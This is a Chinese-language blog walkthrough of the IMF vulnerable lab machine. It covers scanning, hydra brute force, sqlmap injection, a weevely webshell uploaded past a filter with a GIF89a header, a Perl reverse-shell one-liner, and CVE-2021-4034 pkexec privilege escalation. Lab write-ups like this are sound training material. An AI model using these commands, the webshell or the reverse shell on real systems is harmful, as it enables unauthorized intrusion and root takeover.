#  IMF爆肝7小时绿野仙踪寻找6大flag，层层递进、sqlmap、bp、weevely、nc、cve-2021-4034齐装上阵   
原创 泷羽Sec-朝阳  泷羽Sec-朝阳   2025-03-16 20:48  
  
# IMF爆肝7小时，绿野仙踪寻找6大flag，层层递进、sqlmap、bp、weevely、nc、cve-2021-4034齐装上阵  
## 一、信息收集 2025.3.16 AM 13:28  
### 1、主机发现  
  
arp-scan -l nmap -sS 192.168.66.0/24![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5pb32JtdMZfjib1iczebZesIh8pQ2LicoZAolH85FJ2FsgVlCl6DhibQg4Q/640?wx_fmt=png&from=appmsg "")  
  
### 2、指纹扫描  
```
nmap --script=vuln -p 21,22,80 192.168.66.181
扫描端口历史漏洞

```  
```
nmap -sS -sV 192.168.66.181

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

```  
  
这里只扫描出了80端口，端口越少我这心越慌啊，线索有点少 我们先扫描一下目录吧  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5JGLHw3LsXL262Tic5xjm2OaDFXYk2JxHHCtA5P2FDx4Uuxja6KWLIBQ/640?wx_fmt=png&from=appmsg "")  
### 3、目录扫描  
  
dirsearch -u http://192.168.66.181/ -e * -i 200 dirb http://192.168.66.181 nikto -h 192.168.66.181 -p 80 gobuster dir -u http://192.168.66.181/backup_wordpress/-t30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -s 80  
### 4、访问80端口  
  
这里给了一点信息，但是有点模糊，像是用什么指令![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5nLqM1U6rH7Meuan3TVmMLPNe2dYhJWz2f5Um4Hrvn7mCviasZwx8I0A/640?wx_fmt=png&from=appmsg "")  
  
  
这里给了几个邮箱，可能是某些账户![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5QEDrua8AowNtqbznfYBHg5OIXGSicQM5avWD6D3ibtVoTMb8opDibbONg/640?wx_fmt=png&from=appmsg "")  
貌似是有些什么软件，可能会提权，也有一种可能就是我们上传某些命令打开靶机的端口![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW57NBO0njjdJMs4e1ftk6KdVTSu6sGt3V7Sl3s9xiawmKMbcH0cn2aFRA/640?wx_fmt=png&from=appmsg "")  
  
  
这里不知道是不是给了一个小彩蛋![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5656OVwJzqtreibYOZIdA4NuZebuicozbtqcoiaExLAQCZbiauLibAUXTibvg/640?wx_fmt=png&from=appmsg "")  
  
  
allthefiles flag2{aW1mYWRtaW5pc3RyYXRvcg==} imfadministrator![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5NMA9bBIe4t4CmK3otBH7IBrAb6ibjaAiczmkCHfqYEzibvrM7dmFclVjQ/640?wx_fmt=png&from=appmsg "")  
这里解码之后是这两个东西 http://192.168.66.181/imfadministrator/![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5RzMmKky7NoicFibp9U2hgqtvOGJ0ibdtdXUjslIzuS8fD5wic1cGSmyIdg/640?wx_fmt=png&from=appmsg "")  
这里是可以测试出来用户名称的，这下我们可以爆破了  
  
访问了这个路径是一个登录页面，我们爆破一下 hydra -l rmichaels -P /usr/share/wordlists/rockyou.txt 192.168.66.181 http-post-form "/imfadministrator/:user=^USER^&pass=^PASS^:error" 这里无论是什么密码都失败了，看了wp，这里这能使用bp来抓包处理  
### 5、寻找flag3，bp  
  
第三个flag flag3{Y29udGludWVUT2Ntcw==} continueTOcms  
  
使用sqlmap跑一下，正常来说oscp靶场不允许使用bp和sqlmap，但这个靶场有点特殊，我们尝试注入一下![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5NAyrM2sID2S9oqfvbUjGzVvNSEJV3XDsjfKQZAziarxOWticLwia6lMmQ/640?wx_fmt=png&from=appmsg "")  
这里发现了注入点，我们开始爆破  
### 5、寻找flag4，sqlmap  
  
不得不说，sqlmap确实香，一键爆破  
```
sqlmap -u "http://192.168.66.181/imfadministrator/cms.php?pagename=home" --cookie "PHPSESSID=cvjavn85t6cm3pldfr1nbpp9s1" --dbs --batch

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5AasV6IzKEAIVeCyTkHJZdC38OOicPwib6D2XY6Luw9DD7XfKIuiccia8Pg/640?wx_fmt=png&from=appmsg "")  
```
sqlmap -u "http://192.168.66.181/imfadministrator/cms.php?pagename=home" --cookie "PHPSESSID=cvjavn85t6cm3pldfr1nbpp9s1" --D admin --tables --batch

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5z9vhR1dRaic5GLEmLbowTwRSEgurYpJT8zfpTibDPEAaNeagMnwVMYPQ/640?wx_fmt=png&from=appmsg "")  
```
sqlmap -u "http://192.168.66.181/imfadministrator/cms.php?pagename=home" --cookie "PHPSESSID=cvjavn85t6cm3pldfr1nbpp9s1" -D admin --tables --batch 

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5Yu5pqg26ZAelrmfTpZurlXqI7miaN7scwPzcZjSIPj7qmv6qyXnpibFQ/640?wx_fmt=png&from=appmsg "")  
ok,这里是爆了一张图片，我怀疑这台靶机可能是必须要用sqlmap和bo的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5QOIlUScw8iaPndh5mxB2BEHAypBJ7Rzm0kGNAxEPXz94O5vSibTE6fHA/640?wx_fmt=png&from=appmsg "")  
一张图片附带二维码 这里微信扫一下就拿到了flag flag4{dXBsb2Fkcjk0Mi5waHA=}  
### 6、寻找flag5  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5ibd2GQ0Qf7s5wvGSVZm4l9LoEqBFmdHBTjunBoCmY7x0M5OcPC8c3SA/640?wx_fmt=png&from=appmsg "")  
这里还有一个php脚本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5HG3qpicJcUicQJArr4uCV252edhBtia2cy1EVfibiaOleldePanyxJiblvZQ/640?wx_fmt=png&from=appmsg "")  
文件上传，这次离我们提权不远了 经过测试可以上传jpg、png、gif等文件，使用php一句话木马上传文件，靶机使用waf对eval()等函数进行了过滤，需要做一个绕过waf等检查机制，使用weevely生成一个PHP马 这里是我的一个盲区啊，但是我之前打过ctf，大概意思是我们可以修改文件16进制的开头，也就是文件类型  
#### 7、隧道建立nc  
  
weevely generate hack test.php![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW52CMzeDic7otYcSlnMBSoTL0hsxBFAbmdXZibKWSq7ESibWYD0zh3LticRQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5uQtKNo2cctB6AVW7gickIyPusGbAOomqbWE3Gia1NceUhukib1kpCKqiaQ/640?wx_fmt=png&from=appmsg "")  
这次检测这个文件就是png文件了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5zHDgqPhuKOLibPZvwJgQK5KBW8JpcHhc7et207d3oyJ3GiaF7bDSG7YA/640?wx_fmt=png&from=appmsg "")  
这种方式牛的，我之前只在windows系统上用这种方式复原，也算是一种容易被忽略的绕过吧  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5j8nkmMpzZicczhJcqJabXRq928ibJA3pVdPyjw5vHhQO7L8IiaRerN4gw/640?wx_fmt=png&from=appmsg "")  
这里很奇怪，gif可以访问的到，但是png其他格式会报错  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW519Eduz08kHEjDeLMZJWvR0sia3lhlyIBxzXJJzN3y2qJsicxXcD6sBcw/640?wx_fmt=png&from=appmsg "")  
这里连接到了 GIF89a  
  
然后我们创建一个gif图片就可以，是这种文件类型的，然后我们再把上面两段代码放到抓到的包里面就可以了![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5819H8biaTpuPJBiaibuDZzEXicL97tpaQ9eLoBdu9nmJsZK2IazvLkn5rg/640?wx_fmt=png&from=appmsg "")  
这里我们就可以访问到了 f0a5152d5b9b.gif![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW57wPbk8k7Uvl7SN1wqKVuQ4aq92NKYrDUPXLOQao2xfXZDdzI2BrD5g/640?wx_fmt=png&from=appmsg "")  
这个时候我们构建恶意脚本,上传执行命令。  
  
GIF89a  
  
访问这个url即可 URL：http://192.168.66.181/imfadministrator/uploads/822fb3998d69.gif?a=ls![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5Qc8ibRPibDN61dCibbFtehLlhUic8ZDbc10Al2JIM1EWGp53DrKsiaibkajg/640?wx_fmt=png&from=appmsg "")  
这里全是我们之前实验丢进去的文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5t51gAYrOIkY2Tz8aCkibGKae6KB2Kl0KLWHC7PWibehc8I2rMAqgD0OA/640?wx_fmt=png&from=appmsg "")  
flag5{YWdlbnRzZXJ2aWNlcw==}  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5Xo983Sg1rdXVxA4j0HicIa4FaFeftA7ic7GV8gNNd3y1HVia9zkJ0lCyg/640?wx_fmt=png&from=appmsg "")  
这里花了几个小时终于建立了shell，首先尝试python的pty模块![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5lGMPjicO2YjjbHeocRS0UPIic9BVpMXpBDaBVZ4tXHMg0e6zKwMo5lLg/640?wx_fmt=png&from=appmsg "")  
  
```
python -c 'import pty;pty.spawn("/bin/bash")'
这次不行，换种方式
perl -e 'use Socket;$i="192.168.66.129";$p=6677;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
这里我们再弹一个shell

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5Ae6SPAud8wMXnOOr0Lic9yWqwPdVGlibJdC6BwBSJZp8KAe4T5tWmDHA/640?wx_fmt=png&from=appmsg "")  
这是也是建立了隧道  
#### 8、提权  
  
终于终于最后一步了 lsb_release -a  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5wEaxPeIlb1GhGg8qHKz3OIppDyhGFQ9OBXCF2IUYCkzgR5fA7G9I0A/640?wx_fmt=png&from=appmsg "")  
这里上内核提权 这里用到一个提权漏洞：CVE-2021-4034：Linux提权漏洞，主要原因在于Polkit包下的Pkexec工具存在内存损害，允许非特权用户利用提升到ROOT。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5bmBVEYxIsLzHet1px0U6ECPhGz4VicALh3DtODXdPV1HXfppRJ0GjsQ/640?wx_fmt=png&from=appmsg "")  
这里拿到了root权限，我们找一找flag flag6{R2gwc3RQcm90MGMwbHM=}  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5MvpUFvg9aHTibJBOLyGAjIHfAnayxdE4LbicdHlN0uzYbWSceAxqCt3Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0ic9RjEvIx5AbOE7Vy4nNW5Xy2VtMmxQDicvvnHn9cY3unX4zp1XibbwXVicLUzb0VWelljA5TmX8S7w/640?wx_fmt=png&from=appmsg "")  
2025.3.16 PM 20：42  
  
  
